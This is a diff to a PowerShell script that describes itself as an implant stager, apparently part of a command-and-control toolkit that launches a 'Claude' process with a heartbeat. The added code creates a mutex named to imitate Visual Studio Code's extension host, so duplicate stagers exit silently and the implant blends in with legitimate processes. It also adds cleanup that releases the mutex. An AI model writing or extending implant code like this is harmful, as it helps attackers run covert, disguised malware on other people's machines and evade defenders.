@@ -42,6 +42,26 @@ $ErrorActionPreference = "Stop"
 # ── Implant ID (set at build time) ───────────────────────────────────────────
 $ImplantId = '__IMPLANT_ID__'
 
+# ── Mutex check — prevent duplicate stagers ───────────────────────────────────
+# If another instance of this implant is already running, exit silently.
+$mutexName = "Global\VSCodeExtHost_${ImplantId}"
+$script:stagerMutex = $null
+$createdNew = $false
+try {
+    $script:stagerMutex = [System.Threading.Mutex]::new($true, $mutexName, [ref]$createdNew)
+    if (-not $createdNew) {
+        # Another stager instance already running — exit silently
+        Write-Verbose "Stager already running (mutex held). Exiting."
+        $script:stagerMutex.Dispose()
+        return
+    }
+} catch {
+    # Mutex already held by another process — exit silently
+    Write-Verbose "Stager already running (mutex error). Exiting."
+    return
+}
+# Keep mutex held for lifetime of stager — released on exit
+
 # ── Generate staging directory if not provided ──────────────────────────────
 if (-not $StagingDir) {
     $rand = [guid]::NewGuid().ToString('N').Substring(0, 8)
@@ -374,5 +394,12 @@ Write-Verbose "Claude process exited. Heartbeat stopped."
     if (-not $success) {
         Write-Verbose "Staging failed - cleaning up $StagingDir"
         Remove-Item -Path $StagingDir -Recurse -Force -ErrorAction SilentlyContinue
+    }
+    # Release stager mutex
+    if ($script:stagerMutex) {
+        try {
+            $script:stagerMutex.ReleaseMutex()
+            $script:stagerMutex.Dispose()
+        } catch { }
     }
 }
